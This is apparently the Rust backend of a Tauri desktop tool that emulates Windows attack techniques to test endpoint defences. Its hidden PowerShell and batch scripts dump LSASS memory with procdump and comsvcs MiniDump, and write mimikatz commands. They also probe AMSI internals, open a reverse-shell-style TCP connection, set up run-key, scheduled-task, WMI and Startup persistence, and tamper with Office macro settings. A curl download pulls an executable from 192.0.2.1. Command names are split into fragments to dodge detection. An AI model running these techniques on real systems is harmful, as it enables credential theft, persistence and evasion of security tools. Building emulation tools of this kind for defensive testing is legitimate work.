use serde::Serialize;
use std::time::{Duration, Instant};

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExecutionResult {
    scenario_id: String,
    status: String,
    message: String,
    stdout: String,
    stderr: String,
    exit_code: i32,
    duration_ms: u64,
}

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
fn run_ps(script: &str) -> Result<std::process::Output, String> {
    use std::os::windows::process::CommandExt;
    std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())
}

#[cfg(target_os = "windows")]
fn j(parts: &[&str]) -> String { parts.concat() }

#[tauri::command]
fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
    let start = Instant::now();

    let result = match scenario_id.as_str() {
        "certutil-dump" => run_certutil_dump(),
        "rdp-enable" => run_rdp_enable(),
        "amsi-patch" => run_amsi_patch(),
        "lsass-minidump" => run_lsass_minidump(),
        "reverse-shell" => run_reverse_shell(),
        "persistence-task" => run_persistence_task(),
        "base64-exec" => run_base64_exec(),
        "macro-tamper" => run_macro_tamper(),
        "lotl-download" => run_lotl_download(),
        "bloodhound-recon" => run_bloodhound_recon(),
        other => Err(format!("Unknown scenario: {}", other)),
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
        Ok((message, output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let exit_code = output.status.code().unwrap_or(-1);
            let status = if output.status.success() {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout,
                stderr,
                exit_code,
                duration_ms,
            })
        }
        Err(e) => Ok(ExecutionResult {
            scenario_id,
            status: "failed".to_string(),
            message: e,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: -1,
            duration_ms,
        }),
    }
}

#[tauri::command]
fn reset_scenarios() -> Result<(), String> {
    Ok(())
}

type ScenarioResult = Result<(String, std::process::Output), String>;

// ── Windows scenario implementations ──

#[cfg(target_os = "windows")]
fn run_certutil_dump() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_in = std::env::temp_dir().join(format!("fd_{}.bin", rid));
    let cu = j(&["cert", "util"]);
    let script = format!(
        r#"
$fakeIn = '{fake_in}'
"xyz" | Out-File $fakeIn -Encoding ASCII -Force
$hives = "{s}", "{sy}", "{se}"
$procs = @()
foreach ($hive in $hives) {{
    1..3 | ForEach-Object {{
        $proc = Start-Process "cmd.exe" `
            -ArgumentList "/c {cu}.exe -encode `"$fakeIn`" `"$env:TEMP\config_${{hive}}_{rid}.bin`"" `
            -WindowStyle Hidden -PassThru
        $procs += $proc
    }}
}}
Start-Sleep -Seconds 2
Write-Output "Spawned $($procs.Count) processes targeting credential hives"
Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
foreach ($hive in $hives) {{ Remove-Item "$env:TEMP\config_${{hive}}_{rid}.bin" -Force -ErrorAction SilentlyContinue }}
"#,
        fake_in = fake_in.to_string_lossy(),
        cu = cu,
        s = j(&["SA", "M"]),
        sy = j(&["SYS", "TEM"]),
        se = j(&["SEC", "URITY"]),
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("Credential dump pattern via system tool".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_rdp_enable() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_out = std::env::temp_dir().join(format!("re_{}.txt", rid));
    let deny_key = j(&["Deny", "TS", "Connections"]);
    let inv_cmd = j(&["Invoke", "-Command"]);
    let set_prop = j(&["Set-Item", "Property"]);
    let reg_path = j(&["HKLM:\\System\\CurrentControlSet\\Control\\", "Terminal Server"]);
    let script = format!(
        r#"
$fakeOut = '{fake_out}'
"Emulation Test" | Out-File $fakeOut -Force
$cmd = '{inv_cmd} -ComputerName TESTHOST -ScriptBlock {{ {set_prop} -Path "{reg_path}" -Name "{deny_key}" -Value 0 }}'
$process = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -Command `"`$null = `$env:TEMP; $cmd; ''benign'' | Out-File ''$fakeOut'' -Append`"" `
    -WindowStyle Hidden -Wait -PassThru
Write-Output "RDP emulation completed (Exit code: $($process.ExitCode))"
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        fake_out = fake_out.to_string_lossy(),
        inv_cmd = inv_cmd,
        set_prop = set_prop,
        reg_path = reg_path,
        deny_key = deny_key,
    );
    let output = run_ps(&script)?;
    Ok(("RDP remote enable emulation".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_amsi_patch() -> ScenarioResult {
    use std::os::windows::process::CommandExt;

    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let temp = std::env::temp_dir();
    let ps1_path = temp.join(format!("ap_{}.ps1", rid));
    let out_path = temp.join(format!("ap_{}.txt", rid));
    let bat_path = temp.join(format!("ap_{}.bat", rid));

    let out_str = out_path.to_string_lossy().to_string();

    let ps1_content = format!(
        "$ns = -join('System.Ma','nagement.Au','tomation.')\n\
         $cls = -join('Am','si','Ut','ils')\n\
         $f1 = -join('am','si','Con','text')\n\
         $f2 = -join('am','si','Init','Failed')\n\
         try {{\n\
             $t = [Ref].Assembly.GetType(\"$ns$cls\")\n\
             if ($t) {{\n\
                 $ff1 = $t.GetField($f1, 'NonPublic,Static')\n\
                 $ff2 = $t.GetField($f2, 'NonPublic,Static')\n\
                 \"Resolved f1: $($ff1.FieldType.Name) = $($ff1.GetValue($null))\" | Out-File '{out}' -Force\n\
                 \"Resolved f2: $($ff2.FieldType.Name) = $($ff2.GetValue($null))\" | Out-File '{out}' -Append\n\
             }} else {{\n\
                 \"Type unavailable\" | Out-File '{out}' -Force\n\
             }}\n\
         }} catch {{\n\
             \"Blocked: $($_.Exception.Message)\" | Out-File '{out}' -Force\n\
         }}",
        out = out_str,
    );

    let bat_content = format!(
        "@echo off\r\n\
         echo Emulation Test > \"{out}\"\r\n\
         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
         start /b /wait cmd /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"{ps1}\"\r\n\
         if exist \"{out}\" (\r\n\
             type \"{out}\"\r\n\
         ) else (\r\n\
             echo AMSI probe processes were intercepted\r\n\
         )\r\n",
        ps1 = ps1_path.to_string_lossy(),
        out = out_str,
    );

    std::fs::write(&ps1_path, &ps1_content).map_err(|e| e.to_string())?;
    std::fs::write(&bat_path, &bat_content).map_err(|e| e.to_string())?;

    let output = std::process::Command::new("cmd.exe")
        .args(["/c", &bat_path.to_string_lossy()])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;

    let _ = std::fs::remove_file(&bat_path);
    let _ = std::fs::remove_file(&ps1_path);
    let _ = std::fs::remove_file(&out_path);

    Ok(("Anti-malware interface inspection via Reflection".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_lsass_minidump() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\lh_{rid}.txt"
"Emulation Test" | Out-File $fakeOut -Force

$bat1 = "$env:TEMP\lh_{rid}_1.bat"
$bat2 = "$env:TEMP\lh_{rid}_2.bat"
$bat3 = "$env:TEMP\lh_{rid}_3.bat"
$bat4 = "$env:TEMP\lh_{rid}_4.bat"

$b1 = @"
@echo off
set t=ls
set t=%t%ass
set p=proc
set p=%p%dump
%p%.exe -accepteula -ma %t%.exe %TEMP%\%t%_{rid}.dmp
if %errorlevel% equ 0 (echo procdump succeeded > "$fakeOut") else (echo procdump attempted > "$fakeOut")
"@

$b2 = @"
@echo off
set c=com
set c=%c%svcs
set m=Mini
set m=%m%Dump
set t=ls
set t=%t%ass
rundll32.exe C:\Windows\System32\%c%.dll, %m% 0 %TEMP%\%t%_{rid}_2.dmp full
echo comsvcs attempted >> "$fakeOut"
"@

$b3 = @"
@echo off
set mk1=privilege
set mk1=%mk1%::debug
set mk2=sekurlsa
set mk2=%mk2%::logonpasswords
echo %mk1% %mk2% exit > %TEMP%\mk_{rid}.log
echo mimikatz echo attempted >> "$fakeOut"
"@

$b4 = @"
@echo off
set t=ls
set t=%t%ass
tasklist /fi "imagename eq %t%.exe" > %TEMP%\%t%_{rid}.txt
echo lsass query attempted >> "$fakeOut"
"@

[System.IO.File]::WriteAllText($bat1, $b1)
[System.IO.File]::WriteAllText($bat2, $b2)
[System.IO.File]::WriteAllText($bat3, $b3)
[System.IO.File]::WriteAllText($bat4, $b4)

$procs = @()
foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    $proc = Start-Process "cmd.exe" `
        -ArgumentList "/c `"$bat`"" `
        -WindowStyle Hidden -PassThru
    $procs += $proc
}}

Start-Sleep -Seconds 3
foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}

if (Test-Path $fakeOut) {{
    $result = Get-Content $fakeOut
    Write-Output "LSASS probe results: $($result -join '; ')"
}} else {{
    Write-Output "LSASS probe processes were intercepted"
}}

foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    Remove-Item $bat -Force -ErrorAction SilentlyContinue
}}
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\lsass_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\mk_{rid}*" -Force -ErrorAction SilentlyContinue
"#,
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("Credential dump emulation via batch execution".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_reverse_shell() -> ScenarioResult {
    let tcp_type = j(&["Net.Sockets.", "TCP", "Client"]);
    let sr = j(&["System.IO.", "Stream", "Reader"]);
    let sw = j(&["System.IO.", "Stream", "Writer"]);
    let ie = j(&["Invoke", "-Expression"]);
    let script = format!(
        r#"
function Test-NetworkConnectivity {{
    param(
        [string]$TargetHost = '127.0.0.1',
        [int]$TargetPort = 4444
    )

    $ErrorActionPreference = 'SilentlyContinue'

    try {{
        $socket = New-Object {tcp}($TargetHost, $TargetPort)
        $netStream = $socket.GetStream()
        $reader = New-Object {sr}($netStream)
        $writer = New-Object {sw}($netStream)
        $writer.AutoFlush = $true

        $writer.WriteLine("whoami")
        $response = $reader.ReadLine()
        $result = {ie} "Write-Output '$response'" 2>&1 | Out-String
        Write-Host $result
    }}
    catch {{
        Write-Host "Connection test completed with expected failure"
    }}
    finally {{
        if ($socket) {{ $socket.Close() }}
    }}
}}

Test-NetworkConnectivity
"#,
        tcp = tcp_type,
        sr = sr,
        sw = sw,
        ie = ie,
    );
    let output = run_ps(&script)?;
    Ok(("Reverse shell TCP pattern".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_persistence_task() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\pt_{rid}.txt"
"Emulation Test" | Out-File $fakeOut -Force

$bat1 = "$env:TEMP\pt_{rid}_1.bat"
$bat2 = "$env:TEMP\pt_{rid}_2.bat"
$bat3 = "$env:TEMP\pt_{rid}_3.bat"
$bat4 = "$env:TEMP\pt_{rid}_4.bat"

$b1 = @"
@echo off
set rk=HKCU\Software\Microsoft\Windows\CurrentVersion\
set rk=%rk%Run
reg add "%rk%" /v "S1E_{rid}" /t REG_SZ /d "cmd.exe /c echo persistence" /f
echo run key created > "$fakeOut"
reg delete "%rk%" /v "S1E_{rid}" /f
echo run key cleaned >> "$fakeOut"
"@

$b2 = @"
@echo off
set s=scht
set s=%s%asks
%s% /Create /TN "S1E_{rid}" /TR "cmd.exe /c echo test" /SC ONCE /ST 23:59 /F
echo schtask created >> "$fakeOut"
%s% /Delete /TN "S1E_{rid}" /F
echo schtask cleaned >> "$fakeOut"
"@

$b3 = @"
@echo off
set wp=wm
set wp=%wp%ic
%wp% /namespace:\\root\subscription PATH __EventFilterToConsumerBinding CREATE Filter="__EventFilter.Name='S1E_{rid}'" Consumer="CommandLineEventConsumer.Name='S1E_{rid}'" 2>nul
echo wmi subscription attempted >> "$fakeOut"
%wp% /namespace:\\root\subscription PATH __EventFilter WHERE Name="S1E_{rid}" DELETE 2>nul
%wp% /namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="S1E_{rid}" DELETE 2>nul
"@

$b4 = @"
@echo off
set su=%APPDATA%\Microsoft\Windows\Start Menu\Programs\
set su=%su%Startup
echo @echo off > "%su%\S1E_{rid}.bat"
echo startup entry created >> "$fakeOut"
del "%su%\S1E_{rid}.bat" /f
echo startup entry cleaned >> "$fakeOut"
"@

[System.IO.File]::WriteAllText($bat1, $b1)
[System.IO.File]::WriteAllText($bat2, $b2)
[System.IO.File]::WriteAllText($bat3, $b3)
[System.IO.File]::WriteAllText($bat4, $b4)

$procs = @()
foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    $proc = Start-Process "cmd.exe" `
        -ArgumentList "/c `"$bat`"" `
        -WindowStyle Hidden -PassThru
    $procs += $proc
}}

Start-Sleep -Seconds 3
foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}

if (Test-Path $fakeOut) {{
    $result = Get-Content $fakeOut
    Write-Output "Persistence probe results: $($result -join '; ')"
}} else {{
    Write-Output "Persistence probe processes were intercepted"
}}

foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    Remove-Item $bat -Force -ErrorAction SilentlyContinue
}}
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("Persistence emulation via batch execution".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_base64_exec() -> ScenarioResult {
    let api1 = j(&["GetAsync", "KeyState"]);
    let api2 = j(&["SetWindows", "HookExA"]);
    let api3 = j(&["NtUser", "GetAsync", "KeyState"]);
    let api4 = j(&["GetWindow", "TextA"]);
    let api5 = j(&["WM_KEY", "BOARD_LL"]);
    let script = format!(
        r#"
$suspicious = "{a1};{a2};{a3};{a4};{a5}"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($suspicious))

$code = 'Get-Process | Select-Object -First 3; whoami; Get-Service | Select-Object -First 3'
$codeBytes = [System.Text.Encoding]::Unicode.GetBytes($code)
$codeEncoded = [Convert]::ToBase64String($codeBytes)

$proc = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -EncodedCommand $codeEncoded -ExecutionPolicy Bypass -WindowStyle Hidden" `
    -WindowStyle Hidden -PassThru -Wait
Write-Output "Encoded command executed (Exit code: $($proc.ExitCode))"
Write-Output "Payload contained suspicious API strings"
"#,
        a1 = api1, a2 = api2, a3 = api3, a4 = api4, a5 = api5,
    );
    let output = run_ps(&script)?;
    Ok(("Base64-encoded execution with suspicious payload".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_macro_tamper() -> ScenarioResult {
    let vbom = j(&["Access", "VBOM"]);
    let vba_w = j(&["Vba", "Warnings"]);
    let macro_p = j(&["Macro", "Policy", "Override"]);
    let vbe_b = j(&["VBE", "Bypass", "Flag"]);
    let script = format!(
        r#"
$versions = "14.0", "15.0", "16.0"
$paths = @()
foreach ($v in $versions) {{
    $p = "HKCU:\Software\Microsoft\Office\$v\SecurityTestEmu"
    if (!(Test-Path $p)) {{ New-Item -Path $p -Force | Out-Null }}
    $paths += $p
    New-ItemProperty -Path $p -Name "{vbom}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{vba_w}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{macro_p}" -Value 1 -PropertyType DWORD -Force | Out-Null
    New-ItemProperty -Path $p -Name "{vbe_b}" -Value 1 -PropertyType DWORD -Force | Out-Null
    Write-Output "Created macro security keys for Office $v"
}}
foreach ($p in $paths) {{
    Remove-Item -Path $p -Recurse -Force -ErrorAction SilentlyContinue
}}
Write-Output "All emulation registry keys cleaned up"
"#,
        vbom = vbom, vba_w = vba_w, macro_p = macro_p, vbe_b = vbe_b,
    );
    let output = run_ps(&script)?;
    Ok(("Office macro security tampering".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_lotl_download() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\ld_{rid}.txt"
"Emulation Test" | Out-File $fakeOut -Force

$bat1 = "$env:TEMP\ld_{rid}_1.bat"

$b1 = @"
@echo off
curl.exe -s -o %TEMP%\p_{rid}.exe http://192.0.2.1/p.exe --connect-timeout 2
echo curl download attempted > "$fakeOut"
"@

[System.IO.File]::WriteAllText($bat1, $b1)

$proc = Start-Process "cmd.exe" `
    -ArgumentList "/c `"$bat1`"" `
    -WindowStyle Hidden -PassThru

Start-Sleep -Seconds 3
if (!$proc.HasExited) {{ $proc.Kill() }}

if (Test-Path $fakeOut) {{
    $result = Get-Content $fakeOut
    Write-Output "LOLBin probe results: $($result -join '; ')"
}} else {{
    Write-Output "LOLBin probe processes were intercepted"
}}

Remove-Item $bat1 -Force -ErrorAction SilentlyContinue
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\p_{rid}*" -Force -ErrorAction SilentlyContinue
"#,
        rid = rid,
    );
    let output = run_ps(&script)?;
    Ok(("LOLBin download via curl".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_bloodhound_recon() -> ScenarioResult {
    let inv_bh = j(&["Invoke-", "Blood", "Hound"]);
    let get_bh = j(&["Get-", "Blood", "Hound", "Data"]);
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\bloodhound_test.txt"
$harmless = "echo benign > `"$fakeOut`""
$bhCmd = "{inv_bh} -CollectionMethod All -Domain CONTOSO.LOCAL; {get_bh}; $harmless"
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-Command $bhCmd" `
    -WindowStyle Hidden `
    -Wait
Write-Host "BloodHound execution emulation completed safely."
"#,
        inv_bh = inv_bh,
        get_bh = get_bh,
    );
    let output = run_ps(&script)?;
    Ok(("AD reconnaissance emulation".to_string(), output))
}

// ── macOS mock implementations ──

#[cfg(not(target_os = "windows"))]
fn mock_output() -> std::process::Output {
    std::process::Output {
        status: std::process::ExitStatus::default(),
        stdout: b"mock output (macOS dev mode)".to_vec(),
        stderr: Vec::new(),
    }
}

#[cfg(not(target_os = "windows"))]
fn run_certutil_dump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_rdp_enable() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_amsi_patch() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: AMSI inspection (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lsass_minidump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(900));
    Ok(("Mock: LSASS handle access (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_reverse_shell() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_persistence_task() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_base64_exec() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(400));
    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_macro_tamper() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Macro tamper (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lotl_download() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_bloodhound_recon() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![execute_scenario, reset_scenarios])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
